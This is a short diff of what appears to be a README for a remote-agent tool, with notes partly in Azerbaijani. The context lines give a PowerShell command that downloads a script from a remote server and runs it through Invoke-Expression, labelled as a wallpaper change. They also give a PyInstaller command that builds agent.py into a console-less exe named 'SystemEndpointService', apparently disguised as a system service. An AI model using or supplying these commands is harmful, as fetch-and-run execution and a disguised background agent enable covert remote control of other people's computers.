@@ -57,7 +57,7 @@ Change wallpaper to cat image:
 Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://[SERVER_IP]:5000/static/scripts/wallpaper.ps1").Content) )
 ```
 
-Amilnen istifade elediyimiz pyinstaller (exe duzelden):
+ELİnen duzeltdiyimz (exe duzelden):
 ```
 python -m PyInstaller --onefile --noconsole --icon=cog.ico --name=SystemEndpointService agent.py
 ```
